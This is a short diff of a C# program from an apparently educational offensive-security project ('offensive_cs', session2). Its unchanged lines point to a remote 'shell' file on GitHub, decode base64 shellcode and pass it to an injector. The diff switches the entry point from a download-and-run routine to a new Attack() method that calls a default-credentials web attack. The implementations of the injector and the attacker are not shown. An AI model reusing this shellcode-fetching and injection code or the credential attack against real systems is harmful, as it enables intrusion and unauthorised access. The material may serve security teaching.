@@ -24,10 +24,11 @@ namespace session2
 
         private static readonly string url = "https://raw.githubusercontent.com/gaurav-gogia/offensive_cs/main/session2/shell";
 
-        static void Main(string[] args)
+        static void Main()
         {
             //JustRun();
-            DownloadAndRun();
+            //DownloadAndRun();
+            Attack();
         }
 
         private static void JustRun()
@@ -45,6 +46,12 @@ namespace session2
             byte[] shellbyte = Convert.FromBase64String(shellstring);
 
             injector.Inject(shellbyte);
+        }
+
+        private static void Attack()
+        {
+            WebAttacker attacker = new WebAttacker();
+            attacker.DefaultCredsAttack(url);
         }
     }
 }
